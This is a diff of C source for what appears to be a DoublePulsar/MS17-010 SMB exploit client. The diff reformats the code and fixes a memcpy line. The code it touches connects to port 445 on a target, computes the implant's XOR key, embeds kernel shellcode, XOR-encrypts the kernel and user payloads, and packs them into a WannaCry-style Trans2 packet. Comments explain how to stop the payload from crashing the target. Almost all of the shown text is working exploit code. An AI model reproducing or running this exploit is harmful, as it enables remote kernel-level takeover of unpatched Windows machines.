@@ -54,17 +54,17 @@ unsigned char wannacry_Trans2_Request[] =
 "\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
 "\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */
 
-unsigned int LE2INT(unsigned char *data)
+unsigned int LE2INT(unsigned char* data)
 {
-            unsigned int b;
-            b = data[3];
-            b <<= 8;
-            b += data[2];
-            b <<= 8;
-            b += data[1];
-            b <<= 8;
-            b += data[0];
-            return b;
+	unsigned int b;
+	b = data[3];
+	b <<= 8;
+	b += data[2];
+	b <<= 8;
+	b += data[1];
+	b <<= 8;
+	b += data[0];
+	return b;
 }
 
 unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
@@ -119,7 +119,7 @@ int main(int argc, char* argv[])
 	server.sin_family = AF_INET;
 	server.sin_addr.s_addr = inet_addr(argv[1]);
 	server.sin_port = htons((USHORT)445);
-	printf("Connecting to %s\n",argv[1]);
+	printf("Connecting to %s\n", argv[1]);
 	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));
 
 	//send SMB negociate packet
@@ -196,11 +196,11 @@ int main(int argc, char* argv[])
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 
 	/*
-	https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm  
-	Name: kernel  
+	https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm
+	Name: kernel
 	Length: 1019 bytes
-	
-	Requires a userland payload size length to be added at the end 
+
+	Requires a userland payload size length to be added at the end
 	*/
 	unsigned char kernel_shellcode[] =
 		"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
@@ -297,18 +297,18 @@ int main(int argc, char* argv[])
 	char Parametersbuffer[12];
 
 	//allocate memory for encrypted shellcode payload buffer
-	unsigned char *encrypted;
-	encrypted = (unsigned char*)malloc(4096+1);
+	unsigned char* encrypted;
+	encrypted = (unsigned char*)malloc(4096 + 1);
 
 	//initialize to 0
 	memset((unsigned char*)encrypted, 0x00, 4096);
 
 	//copy kernel shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);
-	
+
 	//add the payload shellcode length after the kernel shellcode
 	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
-	memcpy(unsigned char)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, sizeof(DWORD));
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, sizeof(DWORD));
 
 	//TO FIX:
 	//Shellcode is BSODing the target because the length of the payload shellcode is not added
@@ -324,7 +324,7 @@ int main(int argc, char* argv[])
 	/*
 	Because of this, the buffer holding the kernel and user shellcode must be extended by +4 to accomodate the DWORD value.
 	*/
-	
+
 	//copy payload shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, (char*)&shellcode, payload_shellcode_size);
 
@@ -332,8 +332,8 @@ int main(int argc, char* argv[])
 	xor_payload(XorKey, (unsigned char*)encrypted, 4096);
 
 	//allocate memory for the big packet
-	unsigned char* big_packet = (unsigned char*)malloc(4178+1);
-	memset((unsigned char*)big_packet, 0x00, 4178+1);
+	unsigned char* big_packet = (unsigned char*)malloc(4178 + 1);
+	memset((unsigned char*)big_packet, 0x00, 4178 + 1);
 
 	//copy wannacry skeleton packet to big Trans2 packet
 	memcpy((unsigned char*)big_packet, (char*)&wannacry_Trans2_Request, 70);
